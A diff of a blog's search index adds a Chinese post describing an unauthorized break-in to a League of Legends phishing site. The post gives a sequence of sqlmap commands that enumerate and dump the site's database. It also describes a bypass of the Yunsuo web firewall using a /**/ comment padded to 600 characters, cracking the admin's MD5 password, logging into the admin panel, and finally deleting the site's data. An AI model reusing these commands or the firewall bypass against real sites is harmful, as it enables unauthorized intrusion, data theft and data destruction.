@@ -4,17 +4,38 @@
     <title>渗透LOL钓鱼网站</title>
     <url>/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
     <content><![CDATA[<h1 id="渗透LOL钓鱼网站"><a href="#渗透LOL钓鱼网站" class="headerlink" title="渗透LOL钓鱼网站"></a>渗透LOL钓鱼网站</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间收到一封邮件</p>
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/1.jpg" class title="This is an example image">
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/1.jpg" class="" title="This is an 1 image">
 <p>emmmm 是一个钓鱼网站</p>
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/2.png" class title="This is an example image">
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/3.jpg" class title="This is an example image">
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/2.png" class="" title="This is an 2 image">
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/3.jpg" class="" title="This is an 3 image">
 <h2 id="日他"><a href="#日他" class="headerlink" title="日他"></a>日他</h2><p>然后我去百度了一下 看到了  <a href="https://www.secpulse.com/archives/116392.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116392.html</a><br>爆破后台  <a href="http://www.xxx.com.cn/history/login.php" target="_blank" rel="noopener">http://www.xxx.com.cn/history/login.php</a><br>既然人家都做了信息收集我就不做了<br>输入账号密码  账号admin’ 密码 123456</p>
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/4.png" class title="This is an example image">
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/4.png" class="" title="This is an 4 image">
 <p>报错，把地址也爆出来了</p>
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/5.png" class title="This is an example image">
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/5.png" class="" title="This is an 5 image">
 <p>那么，直接用sqlmap跑一下<br>用burp抓包  抓包后 在admin后面加个“*”</p>
-<img src="/.io//12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6.png" class title="This is an example image">
-<p>然后，sqlmap 跑注入<br>‘sqlmap.py -r C:\Users\admin\Desktop\lol.txt –random-agent –level 3 –batch’</p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6.png" class="" title="This is an 6 image">
+<p>然后，sqlmap 跑注入<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch</code></p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/8.png" class="" title="This is an 8 image">
+<p>sqlmap中查库<br><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
+<h3 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/9.png" class="" title="This is an 9 image">
+<p>有云锁  想办法bypass<br>发现只要select 查什么的时候 就会拦截</p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/10.png" class="" title="This is an 10 image">
+<p>去网上看了好多 都失败  当看到最后一个的时候 在 <code>/**/</code>中添加600个字符的时候可以绕过我试了一下</p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/11.png" class="" title="This is an 11 image">
+<p>绕过了   那么直接在lol.txt内加入     <code>/*(里面有600个字符)*/</code>  （由于我不会写tamper）</p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/13.png" class="" title="This is an 13 image">
+<p>(把sqlmap中缓存删除一下)</p>
+<h3 id="sqlmap中查库"><a href="#sqlmap中查库" class="headerlink" title="sqlmap中查库"></a>sqlmap中查库</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch --current-db</code></p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/6666.png" class="" title="This is an 6666 image">
+<p>成功绕过</p>
+<h3 id="sqlmap查表"><a href="#sqlmap查表" class="headerlink" title="sqlmap查表"></a>sqlmap查表</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx --tables</code></p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/16.png" class="" title="This is an 16 image">
+<h3 id="sqlmap查列"><a href="#sqlmap查列" class="headerlink" title="sqlmap查列"></a>sqlmap查列</h3><p><code>sqlmap.py -r C:\Users\admin\Desktop\lol.txt --random-agent --level 3 --batch -D xxxx -T xxx --columns</code></p>
+<img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/18.png" class="" title="This is an 18 image">
+<h3 id="sqlmap查数据"><a href="#sqlmap查数据" class="headerlink" title="sqlmap查数据"></a>sqlmap查数据</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/19.png" class="" title="This is an 19 image">
+<p>密码MD5解密后 Aaxxxxxxxx</p>
+<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><img src="/2019/12/20/%E6%B8%97%E9%80%8FLOL%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/20.png" class="" title="This is an 20 image">
+<p>后台没有什么太多的功能无法getshell 但是数据很多<br>数据库权限是usage<br>最后删除数据</p>
 ]]></content>
   </entry>
   <entry>
